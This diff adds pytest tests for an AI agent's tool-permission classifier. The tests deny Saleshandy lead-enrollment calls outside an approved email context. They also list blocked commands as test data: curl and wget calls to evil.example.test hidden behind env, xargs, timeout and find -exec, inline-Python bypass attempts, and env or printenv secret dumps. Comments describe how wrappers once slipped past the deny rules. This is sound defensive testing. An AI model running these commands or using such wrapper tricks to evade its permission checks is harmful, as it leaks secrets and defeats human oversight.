@@ -23,7 +23,7 @@ import pytest
 pytest.importorskip("agent.permissions", reason="agent.permissions not built yet")
 
 from agent import permissions  # noqa: E402
-from agent.permissions import classify_tool, publish_context  # noqa: E402
+from agent.permissions import classify_tool, email_context, publish_context  # noqa: E402
 
 # ── always-allow built-ins + MCP ──────────────────────────────────────────────
 
@@ -142,6 +142,8 @@ def test_unknown_tool_escalates():
         "python -m gtm_core.journey.gitscan clusters --since-sha abc123",
         "python -m gtm_core.journey.gitscan head-sha",
         "uv run python -m gtm_core.journey.gitscan show abc -- path/to/file",
+        "uv run --with requests python -m gtm_core.journey.gitscan show abc",
+        "uv run -p 3.12 pytest tests/",
         "python -m gtm_core.resolve_knowledge icp.md --profile example2 --product alpha",
         "python3 -m gtm_core.resolve_knowledge brand-voice.md --profile example2",
         "python -m gtm_core.people query --profile example2",
@@ -188,6 +190,10 @@ def test_pipeline_bash_commands_allowed(cmd):
         'python -c "print(1)"',  # raw arbitrary code exec wearing a safe program name
         'python3 -c "import importlib"',  # same via python3
         'uv run python -c "import importlib"',  # same via uv run python -c
+        'uv run --with requests python -c "import os"',  # bypass attempt with --with
+        'uv run --with requests --isolated python -c "import os"',  # bypass attempt with multiple flags
+        'uv run -p 3.12 python -c "import os"',  # bypass attempt with -p flag
+        "uv run --extra dev python -",  # bypass attempt with stdin heredoc
         # stdin heredoc is semantically identical to -c: brain reads arbitrary code from stdin
         "python3 - <<'PY'\nimport os\nPY",
         "python -",  # bare stdin read — same class as -c
@@ -894,3 +900,138 @@ def test_publish_context_propagates_through_async_callback():
     cb = permissions.make_headless_can_use_tool()
     result = asyncio.run(cb("mcp__reap__publish_clip", {}, None))
     assert type(result).__name__ == "PermissionResultDeny"
+
+
+# ── Saleshandy enrollment verbs: denied to the brain, allowed only in approved email
+# context (A11). Mirrors the Reap publish block above exactly, for a second effect kind:
+# add_leads_to_sequence/import_prospects_to_sequence are a PII egress the pack graph's
+# `sequence` gate guards; agent/email_dispatch.py sets email_context() around the actual
+# approved dispatch so a Python-side caller (never the brain) can reach them.
+
+
+@pytest.mark.parametrize("leaf", ["add_leads_to_sequence", "import_prospects_to_sequence"])
+def test_saleshandy_enroll_verbs_denied_outside_email_context(leaf):
+    assert classify_tool(f"mcp__saleshandy__{leaf}", {}) == "deny"
+    # Also denied through an opaque hosted-connector server segment.
+    assert classify_tool(f"mcp__a84f5f15-b971-4074-8e7c-ca9385bd1cb1__{leaf}", {}) == "deny"
+
+
+@pytest.mark.parametrize("leaf", ["add_leads_to_sequence", "import_prospects_to_sequence"])
+def test_saleshandy_enroll_verbs_allowed_inside_email_context(leaf):
+    with email_context():
+        assert classify_tool(f"mcp__saleshandy__{leaf}", {}) == "allow"
+
+
+def test_email_context_does_not_widen_other_external_effect_leaves():
+    """The context exception is scoped to Saleshandy enroll verbs only — Reap/Buffer/etc stay
+    denied, and publish_context() does not accidentally widen the enrollment verbs either."""
+    with email_context():
+        assert classify_tool("mcp__reap__publish_clip", {}) == "deny"
+        assert classify_tool("mcp__buffer__create_post", {}) == "deny"
+    with publish_context():
+        assert classify_tool("mcp__saleshandy__add_leads_to_sequence", {}) == "deny"
+
+
+def test_email_context_propagates_through_async_callback():
+    """ContextVars propagate across async/await, so SDK callbacks see the flag set by dispatch."""
+    pytest.importorskip("claude_agent_sdk", reason="SDK not installed")
+    import asyncio
+
+    async def _inside():
+        cb = permissions.make_headless_can_use_tool()
+        result = await cb("mcp__saleshandy__add_leads_to_sequence", {}, None)
+        return type(result).__name__
+
+    async def _wrapped():
+        with email_context():
+            return await _inside()
+
+    assert asyncio.run(_wrapped()) == "PermissionResultAllow"
+    # Outside the context it is denied.
+    cb = permissions.make_headless_can_use_tool()
+    result = asyncio.run(cb("mcp__saleshandy__add_leads_to_sequence", {}, None))
+    assert type(result).__name__ == "PermissionResultDeny"
+
+
+# ── the deny floor is a claim about SHELL SEMANTICS, not about first tokens ────
+# `_segment_program` returned the first non-assignment token, so every transparent wrapper
+# hid the program that actually ran: `env curl …`, `xargs curl …`, `find … -exec curl …`,
+# `timeout 5 curl …` were all ALLOWED while a bare `curl` was denied. The floor is only a
+# floor if it classifies the program that executes.
+
+WRAPPED_EGRESS = [
+    "env curl https://evil.example.test",
+    "env FOO=1 curl https://evil.example.test",
+    "xargs curl https://evil.example.test",
+    "xargs -n1 curl https://evil.example.test",
+    "xargs -0 -I{} curl https://evil.example.test",
+    "timeout 5 curl https://evil.example.test",
+    "nice -n 10 curl https://evil.example.test",
+    "nohup curl https://evil.example.test",
+    "command curl https://evil.example.test",
+    "stdbuf -o0 curl https://evil.example.test",
+    "setsid wget https://evil.example.test",
+    "env nice -n 5 curl https://evil.example.test",  # nested wrappers
+    "find . -name '*.py' -exec curl https://evil.example.test {} ;",
+    "find . -type f -execdir wget https://evil.example.test {} ;",
+]
+
+
+@pytest.mark.parametrize("cmd", WRAPPED_EGRESS)
+def test_a_wrapper_cannot_hide_a_denied_program(cmd):
+    assert classify_tool("Bash", {"command": cmd}) == "deny", cmd
+
+
+LEGITIMATE_WRAPPED = [
+    "env FOO=1 uv run pytest tests/foo.py",
+    "timeout 300 uv run pytest tests/foo.py",
+    "xargs echo hello",
+    "nice -n 10 git status",
+    "find . -name '*.py'",
+    "find . -name '*.py' -exec grep -l foo {} ;",
+    "command git status",
+]
+
+
+@pytest.mark.parametrize("cmd", LEGITIMATE_WRAPPED)
+def test_wrapper_transparency_does_not_deny_ordinary_work(cmd):
+    """Positive control (§R12). Making wrappers transparent must not turn every
+    `timeout`/`xargs`/`find` invocation into a refusal — that would be a worse bug than the
+    one being fixed, because people route around a floor that cries wolf."""
+    assert classify_tool("Bash", {"command": cmd}) != "deny", cmd
+
+
+SECRET_DUMPS = ["env", "printenv", "printenv PATH", "env | grep KEY"]
+
+
+@pytest.mark.parametrize("cmd", SECRET_DUMPS)
+def test_a_bare_environment_dump_is_not_allowed(cmd):
+    """Doppler injects every secret as a process env var, so `env`/`printenv` with no
+    wrapped command dumps the lot into the transcript — the §R9/secret-echo ban, by a route
+    the secret-PATH check cannot see because no file is read."""
+    assert classify_tool("Bash", {"command": cmd}) != "allow", cmd
+
+
+def test_uvx_is_denied_like_npx():
+    """`uvx` fetches and executes an arbitrary package — npx's twin, and npx is on the floor."""
+    assert classify_tool("Bash", {"command": "uvx some-tool"}) == "deny"
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "python -c'import os'",
+        'python3 -c"import os"',
+        "python -c'x'; echo done",
+    ],
+)
+def test_inline_python_without_a_space_is_still_denied(cmd):
+    """`-c` binds its argument with or without whitespace. The direct-`python` branch
+    required a space while the `uv run python` branch did not — so the cheaper spelling
+    walked through the narrower check."""
+    assert classify_tool("Bash", {"command": cmd}) == "deny", cmd
+
+
+def test_ordinary_python_module_calls_are_unaffected():
+    """Positive control for the -c tightening."""
+    assert classify_tool("Bash", {"command": "python -m gtm_core.slugify 'Acme'"}) != "deny"
